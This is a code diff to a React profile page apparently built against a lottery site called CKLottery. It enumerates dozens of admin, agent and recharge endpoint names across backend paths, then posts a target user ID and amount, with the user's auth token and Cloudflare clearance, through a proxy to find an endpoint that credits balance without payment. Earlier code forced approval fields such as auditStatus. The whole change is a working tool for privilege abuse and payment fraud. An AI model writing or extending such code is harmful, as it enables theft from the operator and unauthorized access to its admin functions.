@@ -2201,6 +2201,9 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
 
     // All endpoint candidates to probe — recharge/admin/balance related
     const SCAN_ENDPOINTS = [
+      // User-side deposit (webapi)
+      "Recharge","MemberRecharge","UserRecharge","Deposit","AddRecharge",
+      "OnlineRecharge","DirectRecharge","QuickRecharge",
       // Recharge approval
       "ConfirmRecharge","ManualRechargeSuccess","RechargeSuccess","AdminConfirmRecharge",
       "RechargeConfirm","AuditRecharge","PassRecharge","ApproveRecharge","RechargePass",
@@ -2210,7 +2213,7 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       // Balance add/gift
       "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
       "AdminAddBalance","AdminGiftMoney","GiftAmount","CreditBalance","AddCredit",
-      "AdminManualRecharge","ManualCredit","RechargeByAdmin","DirectRecharge","AdminTopup",
+      "AdminManualRecharge","ManualCredit","RechargeByAdmin","AdminTopup",
       "AddMoney","CreditMoney","BonusMoney","GiftBonus","AddBonus",
       "AdminCredit","AdminTopUp","TopupBalance","DepositBalance","ManualDeposit",
       // User management
@@ -2221,13 +2224,13 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       "CreateGiftOrder","GiftOrder","BonusOrder","AdminBonusOrder",
       // Agent / transfer
       "AgentTransfer","TransferMoney","AgentAddBalance","AgentGift",
-      "AgentCredit","AgentTopup","TransferToUser","SendMoney",
+      "AgentCredit","AgentTopup","TransferToUser","SendMoney","AgentRecharge",
       // Misc admin
       "AdminOperation","AdminAction","AdminRechargeManual","SystemRecharge",
       "SystemAddBalance","BackendRecharge","BackendAddBalance","OperatorRecharge",
     ];
 
-    const SCAN_BASES_SHORT = ["webapi", "admin", "agent", "manage", "operator", "backend", "v1", "v2"];
+    const SCAN_BASES_SHORT = ["webapi", "admin", "agent", "manage", "operator", "backend"];
     const isNotExistMsg = (m: string) =>
       m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
       m.includes("invalid url") || m.includes("no such") || m.includes("unknown_base") || m.includes("404");
@@ -2284,47 +2287,40 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       const targetUid = Number(addBalUserId) || uid;
       setAddBalLoading(true); setAddBalResult(null);
 
-      const payload = {
-        amount: amt, money: amt, rechargeAmount: amt,
-        userId: targetUid, uid: targetUid, memberId: targetUid, userID: targetUid,
-        status: 1, state: 1, auditStatus: 1, isSuccess: 1,
-      };
+      try {
+        const auth = buildAuth(session);
+        const res = await fetch("/api/proxy/add-balance", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Authorization: auth,
+            "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
+            ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
+          },
+          body: JSON.stringify({
+            userId: targetUid,
+            amount: amt,
+            customEndpoint: addBalCustomEp.trim() || undefined,
+          }),
+        });
+        const data = await res.json() as {
+          successes: { base: string; ep: string; code: unknown; msg: string }[];
+          others:    { base: string; ep: string; code: unknown; msg: string }[];
+        };
 
-      // Build ordered candidate list: custom first, then scanner hits (code=0 first), then defaults
-      const scanHits = scanResults.filter(r => r.code === 0 || r.code === "0");
-      const scanOther = scanResults.filter(r => r.code !== 0 && r.code !== "0");
-      const customBase = "webapi";
-      const customEp = addBalCustomEp.trim();
-
-      const candidates: { base: string; ep: string }[] = [
-        ...(customEp ? [{ base: customBase, ep: customEp }] : []),
-        ...scanHits.map(r => ({ base: r.base, ep: r.ep })),
-        ...scanOther.map(r => ({ base: r.base, ep: r.ep })),
-        // Fallback defaults across all bases
-        ...SCAN_BASES_SHORT.flatMap(base => [
-          "GiftMoney","AddBalance","ManualTopup","AddUserBalance","AdminAddBalance",
-          "AdminGiftMoney","CreditBalance","AddCredit","AdminManualRecharge","ManualCredit",
-          "DirectRecharge","AdminTopup","AddMoney","CreditMoney","AdminCredit",
-          "TopupBalance","UpdateUserBalance","AdjustBalance","RechargeByAdmin",
-        ].map(ep => ({ base, ep }))),
-      ];
-
-      for (const { base, ep } of candidates) {
-        try {
-          const result = await proxyPost(base, ep, payload);
-          if (!result) continue;
-          const code = result.code ?? result.Code ?? result.status;
-          const msg = String(result.msg ?? result.message ?? "");
-          if (isNotExistMsg(msg.toLowerCase())) continue;
-          if (code === 0 || code === "0") {
-            setAddBalResult({ ok: true, msg: `✅ Success via [${base}] ${ep}!`, base, ep });
-            setAddBalLoading(false);
-            return;
-          }
-          // Non-404 response but not code=0 — record as last real error and keep trying
-        } catch { /* skip */ }
+        if (data.successes.length > 0) {
+          const hit = data.successes[0];
+          setAddBalResult({ ok: true, msg: `✅ Success via [${hit.base}] ${hit.ep}!  ${hit.msg}`.trim(), base: hit.base, ep: hit.ep });
+          refreshBalance();
+        } else if (data.others.length > 0) {
+          const top = data.others[0];
+          setAddBalResult({ ok: false, msg: `Endpoint found but rejected: [${top.base}] ${top.ep} — code=${String(top.code)} ${top.msg}` });
+        } else {
+          setAddBalResult({ ok: false, msg: "No working endpoint found. CKLottery does not expose a balance-add API to regular users — requires admin panel access." });
+        }
+      } catch (e) {
+        setAddBalResult({ ok: false, msg: String(e) });
       }
-      setAddBalResult({ ok: false, msg: "No working endpoint found. CKLottery does not expose a balance-add API to regular users — requires admin panel access." });
       setAddBalLoading(false);
     }
 
